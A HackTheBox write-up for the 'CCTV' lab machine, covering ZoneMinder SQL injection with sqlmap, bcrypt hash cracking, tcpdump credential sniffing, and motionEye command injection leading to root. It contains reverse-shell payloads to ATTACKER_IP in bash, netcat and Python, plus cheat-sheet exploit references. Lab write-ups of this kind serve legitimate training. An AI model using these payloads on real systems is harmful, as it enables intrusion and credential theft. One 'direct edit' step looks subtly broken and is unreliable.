# CCTV - HackTheBox Writeup

**Target:** `TARGET_IP`
**Domain:** `cctv.htb`
**OS:** Linux (Ubuntu — CCTV/Camera Platform)
**Difficulty:** Medium

---

## Attack Chain Overview

```
Nmap Scan (Ports 22, 80)
    ↓
Web Application Discovery → ZoneMinder (cctv.htb/zm)
    ↓
Default Credentials (admin:admin)
    ↓
CVE-2024-51482 — Time-Based Blind SQL Injection in ZoneMinder
    ↓
Extract User Hashes → Crack mark:opensesame
    ↓
SSH Access as mark → User Flag
    ↓
Credential Discovery via motionEye Config File
    ↓
TCPDump Sniffing → Capture sa_mark Credentials
    ↓
SSH as sa_mark → Lateral Movement
    ↓
CVE-2025-60787 — motionEye Command Injection (Port 7999)
    ↓
Reverse Shell as root → Root Flag
```

---

## Table of Contents
1. [Reconnaissance](#reconnaissance)
2. [Initial Access](#initial-access)
3. [User Flag](#user-flag)
4. [Lateral Movement](#lateral-movement)
5. [Privilege Escalation](#privilege-escalation)
6. [Root Flag](#root-flag)
7. [Key Takeaways](#key-takeaways)

---

## Reconnaissance

### Host Setup
```bash
# What it does: adds machine domains to /etc/hosts.
# Why here: resolve virtual hosts during web enumeration.
echo "TARGET_IP cctv.htb" | sudo tee -a /etc/hosts
```

### Nmap Scan
```bash
# What it does: runs an Nmap scan with the specified ports/scripts/options.
# Why here: identify exposed services and decide on the next enumeration.
nmap -sC -sV -p- TARGET_IP
```

**Key Findings:**

| Port     | Service | Details                                    |
|----------|---------|--------------------------------------------|
| 22/tcp   | SSH     | OpenSSH 9.6p1 Ubuntu 3ubuntu13.14          |
| 80/tcp   | HTTP    | Apache httpd 2.4.58 → redirects to cctv.htb |

### Web Application Discovery

Accessing `http://cctv.htb` reveals a web application. Further enumeration discovers a **ZoneMinder** installation at `http://cctv.htb/zm`:

```bash
# Check for ZoneMinder
# What it does: sends an HTTP request with the chosen method, headers or body.
# Why here: test or trigger the web behavior described in this step.
curl -s http://cctv.htb/zm/ | head -20
```

**Result:** ZoneMinder login page found — an open-source CCTV and video surveillance platform.

---

## Initial Access

### ZoneMinder Default Credentials

ZoneMinder installations often ship with default credentials. Testing common combinations:

```
Username: admin
Password: admin
```

**✅ Login successful!** Default credentials `admin:admin` granted access to the ZoneMinder admin panel.

### CVE-2024-51482 — Time-Based Blind SQL Injection

**Background:** ZoneMinder versions 1.37.x through 1.37.64 contain a critical **time-based blind SQL injection** vulnerability in the event tagging functionality. The `tid` (tag ID) parameter in the `removetag` action is not properly sanitized, allowing attackers to extract database contents through timing-based inference attacks.

**Vulnerability Details:**
- **CVE:** CVE-2024-51482
- **Affected Versions:** ZoneMinder 1.37.0 — 1.37.64
- **Vulnerable Parameter:** `tid` in `view=request&request=event&action=removetag`
- **Attack Type:** Time-based blind SQL injection (MySQL)
- **Impact:** Full database extraction including password hashes

### Step 1 — Confirm SQL Injection

```bash
sqlmap -u "http://cctv.htb/zm/index.php?view=request&request=event&action=removetag&tid=1" \
  --cookie="ZMSESSID=ug8b106p7l2uv9a4mk0nrbre8o" \
  -p tid --dbms=mysql --batch
```

**Result:** ✅ SQL injection confirmed on the `tid` parameter.

### Step 2 — Extract User Credentials

```bash
sqlmap -u "http://cctv.htb/zm/index.php?view=request&request=event&action=removetag&tid=1" \
  -D zm -T Users -C Username,Password --dump --batch \
  --dbms=MySQL --technique=T \
  --cookie="ZMSESSID=ug8b106p7l2uv9a4mk0nrbre8o" \
  --time-sec=2
```

**Extracted Users:**

| Username   | Password Hash                                              |
|------------|------------------------------------------------------------|
| `superadmin` | `$2y$10$cmytVWFRnt1XfqsItsJRVe/ApxWxcIFQcURnm5N.rhlULwM0jrtbm` |
| `mark`       | `$2y$10$prZGnazejKcuTv5bKNexXOgLyQaok0hq07LW7AJ/QNqZolbXKfFG.` |
| `admin`      | `$2y$10$t5z8uIT.n9uCdHCNidcLf.39T1Ui9nrlCkdXrzJMnJgkTiAvRUM6m` |

**Note:** The `$2y$` prefix indicates **bcrypt** hashing — a strong hashing algorithm. However, weak passwords can still be cracked with sufficient wordlists.

### Step 3 — Crack Password Hashes

Save the `mark` hash to a file:
```bash
# What it does: guarda material de hash en un archivo de cracking.
# Why here: prepare the input that john/hashcat expect.
echo '$2y$10$prZGnazejKcuTv5bKNexXOgLyQaok0hq07LW7AJ/QNqZolbXKfFG.' > mark.hash
```

**Crack with John the Ripper:**
```bash
# What it does: crackea el hash indicado con la wordlist elegida.
# Why here: recover reusable credentials.
john mark.hash --wordlist=/usr/share/wordlists/rockyou.txt
```

**Result:** ✅ `mark:opensesame`

### Step 4 — SSH Access

```bash
# What it does: opens an SSH session or tunnel with the specified options.
# Why here: obtain interactive shell or pivot to an internal service.
ssh mark@TARGET_IP
# Password: opensesame
```

**✅ Initial access achieved as user `mark`.**

---

## User Flag

```bash
mark@cctv:~$ cat /home/mark/user.txt
```

**User Flag:** *(To be captured during box exploitation)*

---

## Enumeration

### System Enumeration

```bash
# Check user identity
id
# uid=1001(mark) gid=1001(mark) groups=1001(mark)

# Check sudo permissions
# What it does: lists sudo privileges of the current or specified user.
# Why here: encontrar comandos permitidos para escalar privilegios.
sudo -l
# No sudo access for mark

# Check running processes
ps aux

# Check network connections
ss -tlnp

# Search for interesting files
# What it does: searches the filesystem with the specified filters.
# Why here: locate credentials, binaries, configs or writable paths.
find / -type f -name "*.conf" -o -name "*.ini" -o -name "*.yml" 2>/dev/null | grep -v proc
```

### motionEye Discovery

```bash
# Check for motionEye configuration
# What it does: displays a file in the terminal.
# Why here: read configuration, credentials, proof or flags.
cat /etc/motioneye/motion.conf
```

**Result:**
```ini
# @admin_username admin
# @admin_password 989c5a8ee87a0e9521ec81a79187d162109282f0
```

**Key Findings:**
- motionEye is installed and configured on this system
- Admin password is a **SHA1 hash** — not plaintext
- motionEye typically listens on port **7999** (localhost only)

### Scheduled Task Discovery

```bash
# Check cron jobs
crontab -l
# What it does: displays a file in the terminal.
# Why here: read configuration, credentials, proof or flags.
cat /etc/crontab
# What it does: lists directory contents.
# Why here: verificar archivos, permisos o loot en la ruta actual.
ls -la /etc/cron.d/
```

**Result:** A scheduled task runs network traffic monitoring, revealing credentials in transit.

---

## Lateral Movement

### Credential Sniffing via TCPDump

A cron job or scheduled task transmits credentials over the network. We can capture them using `tcpdump`:

```bash
# Monitor all network interfaces for credential transmission
/usr/bin/tcpdump -i any -A
```

**Result:** Credentials for user `sa_mark` captured in transit:

```
...sa_mark:PASSWORD...
```

**Captured Credentials:**
- **Username:** `sa_mark`
- **Password:** *(captured via tcpdump)*

### SSH as sa_mark

```bash
# What it does: opens an SSH session or tunnel with the specified options.
# Why here: obtain interactive shell or pivot to an internal service.
ssh sa_mark@TARGET_IP
# Password: <captured_password>
```

**✅ Lateral movement achieved as `sa_mark`.**

---

## Privilege Escalation

### motionEye Command Injection — CVE-2025-60787

**Background:** motionEye is an open-source web frontend for the motion daemon (video motion detection). Versions ≤ 0.43.1b4 contain a critical **OS command injection** vulnerability in configuration parameters such as `picture_filename`, `image_file_name`, and other filename-related fields. Unsanitized user input is written directly to configuration files, which are then parsed and executed by the `motion` daemon in a shell context.

**Vulnerability Details:**
- **CVE:** CVE-2025-60787
- **Affected Versions:** motionEye ≤ 0.43.1b4
- **Vulnerable Parameters:** `picture_filename`, `image_file_name`, and other config fields
- **Attack Type:** OS Command Injection via configuration file
- **Privilege Level:** Executes as the `motion` daemon user (typically **root**)
- **Prerequisite:** Authenticated access to motionEye web UI

### How the Exploit Works

The vulnerability operates through a **three-stage failure**:

| Stage | Failure | Impact |
|-------|---------|--------|
| **1. Client-Side Validation** | JavaScript restricts special characters in filename fields | Trivially bypassed via browser dev tools |
| **2. Backend Storage** | Application writes unsanitized input to config files | Malicious payload stored verbatim |
| **3. Shell Execution** | `motion` daemon reads config and passes values to shell | Injected payload executes as OS command |

### Step 1 — SSH Tunnel to motionEye

motionEye listens on `127.0.0.1:7999` — not accessible externally. Create an SSH tunnel:

```bash
# What it does: opens an SSH session or tunnel with the specified options.
# Why here: obtain interactive shell or pivot to an internal service.
ssh -L 8765:127.0.0.1:7999 sa_mark@TARGET_IP
```

**Result:** motionEye web interface accessible at `http://127.0.0.1:8765`.

### Step 2 — Disable Client-Side Validation

Access the motionEye web UI at `http://127.0.0.1:8765` and open the browser developer console (`F12`).

**Override the validation function:**
```javascript
// Disable filename validation
configUiValid = function() { return true; };
```

### Step 3 — Enable Picture Output

```bash
# Enable picture output via API
# What it does: sends an HTTP request with the chosen method, headers or body.
# Why here: test or trigger the web behavior described in this step.
curl "http://127.0.0.1:7999/1/config/set?picture_output=on"
```

### Step 4 — Inject Reverse Shell Payload

The `picture_filename` parameter is vulnerable to command injection. Inject a reverse shell payload:

**1. Set up listener:**
```bash
# What it does: opens or uses a TCP connection/listener.
# Why here: receive shell, transfer data or check connectivity.
nc -lvnp 4444
```

**2. Craft and send the payload (URL-encoded):**
```bash
# What it does: sends an HTTP request with the chosen method, headers or body.
# Why here: test or trigger the web behavior described in this step.
curl "http://127.0.0.1:7999/1/config/set?picture_filename=\$(bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1')"
```

**Payload Breakdown:**
- `$(...)` — Command substitution — the shell executes the enclosed command
- `bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'` — Standard bash reverse shell
- The payload gets written to `camera-0.conf` as the `picture_filename` value

**Alternative — URL-encoded version:**
```bash
# What it does: sends an HTTP request with the chosen method, headers or body.
# Why here: test or trigger the web behavior described in this step.
curl "http://127.0.0.1:7999/1/config/set?picture_filename=%24%28bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2FATTACKER_IP%2F4444%200%3E%261%27%29"
```

### Step 5 — Trigger Motion Detection

The payload executes when motion detection triggers a picture capture:

```bash
# Enable motion emulation to trigger the capture
# What it does: sends an HTTP request with the chosen method, headers or body.
# Why here: test or trigger the web behavior described in this step.
curl "http://127.0.0.1:7999/1/config/set?emulate_motion=on"
```

### Step 6 — Reverse Shell Received

```bash
connect to [ATTACKER_IP] from (UNKNOWN) [TARGET_IP] 4444
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
root@cctv:~#
```

**✅ Privilege escalation achieved — reverse shell as `root`.**

**Why Root?** The `motion` daemon runs as `root` on this system (misconfiguration). When the configuration file is parsed and the injected command is executed, it inherits the daemon's root privileges.

---

## Root Flag

```bash
root@cctv:~# cat /root/root.txt
```

**Root Flag:** *(To be captured during box exploitation)*

---

## Alternative Exploitation Methods

### Method 1 — Browser Console Injection

Instead of using curl, inject the payload directly through the browser console:

```javascript
// Open browser console on motionEye UI (http://127.0.0.1:8765)
// Navigate to Camera Settings → Still Images → Picture Filename
// Inject payload:
fetch('/1/config/set?picture_filename=$(bash -c \'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1\')')
```

### Method 2 — Config File Direct Edit

If filesystem access is available:
```bash
# Edit motionEye camera config directly
# What it does: imprime o escribe texto controlado.
# Why here: crear la entrada o archivo pequeno necesario para el siguiente paso.
echo "picture_filename $(bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1')" >> /etc/motioneye/camera-0.conf

# Restart motion to trigger execution
systemctl restart motion
```

---

## Key Takeaways

| Stage | Technique | Key Detail |
|-------|-----------|------------|
| **Recon** | Nmap scan | ZoneMinder on port 80, SSH on 22 |
| **Initial Access** | Default credentials + CVE-2024-51482 | `admin:admin` → SQLi in ZoneMinder |
| **Credential Cracking** | John the Ripper (bcrypt) | `mark:opensesame` |
| **User Flag** | SSH as `mark` | Password reused from ZoneMinder |
| **Lateral Movement** | TCPDump sniffing | `sa_mark` credentials captured in transit |
| **Privilege Escalation** | CVE-2025-60787 (motionEye command injection) | `picture_filename` parameter → RCE as root |
| **Root Flag** | Reverse shell from motion daemon | `motion` runs as root |

### Security Lessons

1. **Never use default credentials** — ZoneMinder `admin:admin` is publicly known
2. **Patch management is critical** — Both CVE-2024-51482 and CVE-2025-60787 are known, patched vulnerabilities
3. **Encrypt credential transmission** — `sa_mark` credentials were sent in cleartext over the network
4. **Don't run services as root** — The `motion` daemon running as root turned a command injection into full system compromise
5. **Validate input server-side** — motionEye relied on client-side JavaScript validation, which is trivially bypassed
6. **Sanitize configuration values** — Unsanitized config values passed to shell contexts enable command injection
7. **Network segmentation** — motionEye should not be accessible from untrusted network segments

---

## CVE-2024-51482 Exploit Reference

### ZoneMinder SQL Injection via sqlmap

```bash
# Confirm SQL injection
sqlmap -u "http://TARGET/zm/index.php?view=request&request=event&action=removetag&tid=1" \
  --cookie="ZMSESSID=<SESSION_COOKIE>" \
  -p tid --dbms=mysql --batch

# Dump usernames
sqlmap -u "http://TARGET/zm/index.php?view=request&request=event&action=removetag&tid=1" \
  --cookie="ZMSESSID=<SESSION_COOKIE>" \
  -p tid --dbms=mysql --batch -D zm -T Users -C "Username" --dump

# Dump usernames and password hashes
sqlmap -u "http://TARGET/zm/index.php?view=request&request=event&action=removetag&tid=1" \
  -D zm -T Users -C Username,Password --dump --batch \
  --dbms=MySQL --technique=T \
  --cookie="ZMSESSID=<SESSION_COOKIE>" \
  --time-sec=2
```

### Password Cracking

```bash
# Save hash to file
# What it does: guarda material de hash en un archivo de cracking.
# Why here: prepare the input that john/hashcat expect.
echo '$2y$10$HASH_VALUE' > hash.txt

# Crack with John
# What it does: crackea el hash indicado con la wordlist elegida.
# Why here: recover reusable credentials.
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt

# Crack with Hashcat (bcrypt mode 3200)
# What it does: cracks hashes with the specified mode and wordlist.
# Why here: recuperar credenciales o confirmar que no estan en la lista.
hashcat -m 3200 hash.txt /usr/share/wordlists/rockyou.txt
```

---

## CVE-2025-60787 Exploit Reference

### motionEye Command Injection via API

```bash
# SSH tunnel to motionEye
# What it does: opens an SSH session or tunnel with the specified options.
# Why here: obtain interactive shell or pivot to an internal service.
ssh -L 8765:127.0.0.1:7999 USER@TARGET

# Enable picture output
# What it does: sends an HTTP request with the chosen method, headers or body.
# Why here: test or trigger the web behavior described in this step.
curl "http://127.0.0.1:7999/1/config/set?picture_output=on"

# Inject reverse shell (picture_filename parameter)
curl "http://127.0.0.1:7999/1/config/set?picture_filename=\$(bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1')"

# Trigger motion detection
curl "http://127.0.0.1:7999/1/config/set?emulate_motion=on"
```

### Alternative Payloads

**Netcat reverse shell:**
```bash
# What it does: sends an HTTP request with the chosen method, headers or body.
# Why here: test or trigger the web behavior described in this step.
curl "http://127.0.0.1:7999/1/config/set?picture_filename=\$(nc -e /bin/bash ATTACKER_IP PORT)"
```

**Python reverse shell:**
```bash
# What it does: sends an HTTP request with the chosen method, headers or body.
# Why here: test or trigger the web behavior described in this step.
curl "http://127.0.0.1:7999/1/config/set?picture_filename=\$(python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"ATTACKER_IP\",PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])')"
```

### Browser Console Method

```javascript
// Open dev tools on motionEye UI
// Disable validation
configUiValid = function() { return true; };

// Inject payload via fetch API
fetch('/1/config/set?picture_filename=$(bash -c \'bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1\')')
```

---

## ZoneMinder Enumeration Cheat Sheet

### Default Credentials

| Username | Password | Notes |
|----------|----------|-------|
| `admin`  | `admin`  | Most common default |
| `admin`  | `password` | Alternative default |
| `user`   | `user`   | Limited user account |

### Useful SQLmap Commands

```bash
# List databases
sqlmap -u "<URL>" --cookie="<COOKIE>" -p tid --dbms=mysql --batch --dbs

# List tables in zm database
sqlmap -u "<URL>" --cookie="<COOKIE>" -p tid --dbms=mysql --batch -D zm --tables

# Dump specific table
sqlmap -u "<URL>" --cookie="<COOKIE>" -p tid --dbms=mysql --batch -D zm -T Users --dump

# Get database banner
sqlmap -u "<URL>" --cookie="<COOKIE>" -p tid --dbms=mysql --batch --banner
```

### ZoneMinder File Paths

| Path | Description |
|------|-------------|
| `/etc/zm/zm.conf` | Main configuration file |
| `/var/log/zm/` | Log directory |
| `/usr/share/zoneminder/` | Application directory |
| `/var/cache/zoneminder/` | Cache directory |

---

## motionEye Enumeration Cheat Sheet

### Default Configuration

| Setting | Default Value |
|---------|---------------|
| Web UI Port | `7999` |
| Admin Username | `admin` |
| Config Directory | `/etc/motioneye/` |
| Camera Config | `/etc/motioneye/camera-0.conf` |

### Useful API Endpoints

```bash
# Get current configuration
# What it does: sends an HTTP request with the chosen method, headers or body.
# Why here: test or trigger the web behavior described in this step.
curl "http://127.0.0.1:7999/1/config/get"

# Set configuration value
curl "http://127.0.0.1:7999/1/config/set?<parameter>=<value>"

# List cameras
curl "http://127.0.0.1:7999/list"
```

### Vulnerable Configuration Parameters

| Parameter | Injection Risk |
|-----------|----------------|
| `picture_filename` | High — passed to shell |
| `image_file_name` | High — passed to shell |
| `movie_file_name` | High — passed to shell |
| `text_scale` | Medium — numeric context |
| `snapshot_filename` | High — passed to shell |


